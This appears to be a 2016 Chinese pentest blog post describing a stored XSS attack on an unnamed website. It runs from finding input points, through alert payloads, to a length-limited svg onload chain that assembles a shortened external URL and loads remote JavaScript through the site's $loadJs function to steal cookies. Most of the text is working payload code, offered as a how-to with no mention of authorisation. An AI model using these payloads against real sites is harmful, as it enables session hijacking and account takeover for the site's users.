---
draft: false
date: 2016-07-17 23:30:54
title: 一次存储型 XSS 利用实例
description: 
categories:
  - Pentest
tags:
  - xss
---

首先感谢凯神的指导

### 0x00 注册账号
先得到一个临时邮箱，然后注册账号
![65](/img/post/xss_example_get_temporary_email.png)

![35](/img/post/xss_example_register.png)

### 0x01 找输入输出点
![40](/img/post/xss_example_add_topic.png)

![80](/img/post/xss_example_input_output_point.png)

### 0x02 尝试构造payload
payload用如下的即可：
```
<script>alert(1)</script>
"><script>alert(1)</script><a
```
但是这个要在点击删除时payload才起作用
![40](/img/post/xss_example_payload_test.png)
```
也可用<img src=1 onerror=alert(1) />自动加载，但也要点击删除按钮才能起作用  
但是我们若想充分利用则需要远程加载自己的js
```

### 0x03 加载自己的js
* 此时的限制条件为：

```
* 30个字符
* script标签不能自己触发
```

* 只能构造类似下面的语句自己加载脚本：

```
a=document.createElement('script');
a.src="www.xxx.com";
document.head.appendChild(a);
```

* 可以用如下方法分割，多次添加：

```
a=document.createE/*
*/lement('script');/*
*/a.src="www.xxx.com";/*
*/document.head.app/*
*/endChild(a);

但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行
```

* 查找
![50](/img/post/xss_example_find_loadjs.png)

* 构造payload
![45](/img/post/xss_example_short_url.png)

```
使用如下payload：
<svg/onload="b='http://t.i'">
<svg/onload="b+='m/16ap6'">
<svg/onload="$loadJs(b)">
```

### 0x04 得到Cookie
![70](/img/post/xss_example_get_cookie.png)
